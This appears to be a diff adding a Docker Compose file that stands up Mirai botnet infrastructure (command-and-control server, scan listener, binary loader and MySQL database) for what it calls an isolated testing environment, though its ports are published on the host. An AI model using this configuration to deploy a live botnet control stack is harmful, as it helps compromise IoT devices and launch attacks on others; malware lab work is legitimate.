@@ -1,0 +1,83 @@
+# Docker Setup for Mirai Testing Environment
+# This creates an isolated environment for testing Mirai botnet infrastructure
+
+version: '3.8'
+
+services:
+  # MySQL Database
+  mysql:
+    image: mysql:5.7
+    container_name: mirai-mysql
+    environment:
+      MYSQL_ROOT_PASSWORD: mirai123
+      MYSQL_DATABASE: mirai
+    ports:
+      - "3306:3306"
+    volumes:
+      - mysql-data:/var/lib/mysql
+      - ./scripts/db.sql:/docker-entrypoint-initdb.d/01-schema.sql
+      - ./scripts/init-user.sql:/docker-entrypoint-initdb.d/02-user.sql
+    networks:
+      - mirai-net
+    restart: unless-stopped
+
+  # CNC Build and Run Environment
+  cnc:
+    build:
+      context: .
+      dockerfile: Dockerfile.cnc
+    container_name: mirai-cnc
+    depends_on:
+      - mysql
+    ports:
+      - "23:23"     # CNC telnet interface
+      - "101:101"   # API port
+    volumes:
+      - ./mirai:/app/mirai
+    networks:
+      - mirai-net
+    restart: unless-stopped
+    command: ["sh", "-c", "sleep 10 && /app/mirai/debug/cnc"]
+
+  # Scan Listener
+  scanlistener:
+    build:
+      context: .
+      dockerfile: Dockerfile.cnc
+    container_name: mirai-scanlistener
+    depends_on:
+      - cnc
+    ports:
+      - "48101:48101"  # Scan callback port
+    volumes:
+      - ./mirai:/app/mirai
+    networks:
+      - mirai-net
+    restart: unless-stopped
+    command: ["/app/mirai/debug/scanListen", "48101"]
+
+  # Loader
+  loader:
+    build:
+      context: .
+      dockerfile: Dockerfile.loader
+    container_name: mirai-loader
+    depends_on:
+      - scanlistener
+    ports:
+      - "8080:8080"  # HTTP server for binaries
+    volumes:
+      - ./loader:/app/loader
+    networks:
+      - mirai-net
+    restart: unless-stopped
+
+networks:
+  mirai-net:
+    driver: bridge
+    ipam:
+      config:
+        - subnet: 172.20.0.0/16
+
+volumes:
+  mysql-data:
